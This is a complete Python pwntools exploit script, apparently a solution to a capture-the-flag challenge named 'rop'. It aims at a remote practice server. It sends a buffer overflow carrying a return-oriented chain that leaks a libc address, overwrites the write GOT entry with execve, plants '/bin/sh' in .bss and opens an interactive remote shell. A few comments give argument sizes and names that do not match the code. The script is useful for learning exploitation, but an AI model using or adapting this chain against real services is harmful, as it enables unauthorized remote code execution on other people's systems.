from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3021)
#p = process('./rop')
e = ELF('./rop')

#gdb.attach(p)

pppr = 0x8048509
bss = e.get_section_by_name('.bss').header.sh_addr
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']


payload = ''
payload += 'a'*0x88 + 'b'*0x4

# write(1, read@got, 8)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(0x1)
payload += p32(read_got)
payload += p32(0x4)

# read(0, write@got, 8)	=> input system@got 
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0x0)
payload += p32(write_got)
payload += p32(0x4)

# read(0, .bss, 8)	=> input "/bin/sh"
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0x0)
payload += p32(bss)
payload += p32(0x7)

# write(0, .bss, 0)	=> execve(0, "/bin/sh", 0)
payload += p32(write_plt)
payload += "\x90"*4
payload += p32(bss)
payload += p32(0x0)
payload += p32(0x0)

p.sendline(payload)

read_got = u32(p.recv().replace('\n',''))
#execve_got = read_got - 0x27700
execve_got = read_got - 0x24dc0

log.info('==== weapon ====')
print 'read@got = ', hex(read_got)
print 'execve@got = ', hex(execve_got)
log.info('=================')

p.send(p32(execve_got))
p.sendline("/bin/sh")

sleep(1)

p.interactive()


